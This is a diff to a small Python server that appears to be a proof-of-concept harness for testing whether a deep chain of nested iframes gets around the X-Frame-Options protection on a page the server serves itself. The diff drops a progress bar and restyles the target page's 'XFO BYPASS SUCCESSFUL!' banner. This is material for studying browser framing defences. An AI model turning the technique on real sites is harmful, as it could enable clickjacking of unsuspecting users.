@@ -20,9 +20,6 @@ def serve_path(path):
         level = int(path)
         
         if level < MAX_DEPTH:
-            # Calculate progress percentage
-            progress_percent = (level / MAX_DEPTH) * 100
-            
             # Return page that iframes the next level
             html = f"""
             <!DOCTYPE html>
@@ -39,23 +36,12 @@ def serve_path(path):
                         }}
                         iframe {{
                             width: 100%;
-                            height: calc(100% - 5px);
+                            height: 100%;
                             border: none;
-                            margin-top: 5px;
-                        }}
-                        .progress-bar {{
-                            position: fixed;
-                            top: 0;
-                            left: 0;
-                            height: 5px;
-                            background: #4CAF50;
-                            width: {progress_percent}%;
-                            z-index: 1000;
                         }}
                     </style>
                 </head>
                 <body>
-                    <div class="progress-bar"></div>
                     <iframe src="/{level + 1}"></iframe>
                 </body>
             </html>
@@ -78,23 +64,12 @@ def serve_path(path):
                         }}
                         iframe {{
                             width: 100%;
-                            height: calc(100% - 5px);
+                            height: 100%;
                             border: none;
-                            margin-top: 5px;
-                        }}
-                        .progress-bar {{
-                            position: fixed;
-                            top: 0;
-                            left: 0;
-                            height: 5px;
-                            background: #ff5555;
-                            width: 100%;
-                            z-index: 1000;
                         }}
                     </style>
                 </head>
                 <body>
-                    <div class="progress-bar"></div>
                     <iframe src="/gg.html"></iframe>
                 </body>
             </html>
@@ -107,41 +82,48 @@ def serve_path(path):
         <!DOCTYPE html>
         <html>
             <head>
-                <title>Target Page (gg.html)</title>
+                <title>TARGET REACHED</title>
                 <style>
                     body {
-                        background-color: #ffcccc;
+                        background-color: #ff0000;
                         font-family: Arial, sans-serif;
                         text-align: center;
-                        padding: 50px;
-                        margin: 0;
-                    }
-                    .success-message {
-                        background-color: #ff5555;
-                        color: white;
                         padding: 20px;
-                        border-radius: 10px;
-                        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-                        margin: 20px auto;
-                        max-width: 600px;
-                        animation: pulse 2s infinite;
+                        margin: 0;
+                        color: white;
+                        height: 100vh;
+                        display: flex;
+                        flex-direction: column;
+                        justify-content: center;
+                        align-items: center;
+                        animation: flash 1s infinite;
                     }
-                    @keyframes pulse {
-                        0% { transform: scale(1); }
-                        50% { transform: scale(1.05); }
-                        100% { transform: scale(1); }
+                    @keyframes flash {
+                        0%, 100% { background-color: #ff0000; }
+                        50% { background-color: #ff5555; }
                     }
                     h1 {
-                        color: red;
+                        font-size: 48px;
+                        margin-bottom: 20px;
+                    }
+                    .success-box {
+                        background-color: rgba(0,0,0,0.5);
+                        padding: 20px;
+                        border-radius: 10px;
+                        max-width: 600px;
+                        margin: 0 auto;
+                    }
+                    p {
+                        font-size: 24px;
+                        margin: 10px 0;
                     }
                 </style>
             </head>
             <body>
-                <h1>Target Content (gg.html)</h1>
-                <div class="success-message">
-                    <h2>XFO BYPASS SUCCESSFUL!</h2>
+                <h1>XFO BYPASS SUCCESSFUL!</h1>
+                <div class="success-box">
                     <p>This page has XFO: SAMEORIGIN header</p>
-                    <p>If you can see this content in the iframe chain, then XFO has been bypassed!</p>
+                    <p>If you can see this content, the XFO protection has been bypassed!</p>
                 </div>
             </body>
         </html>
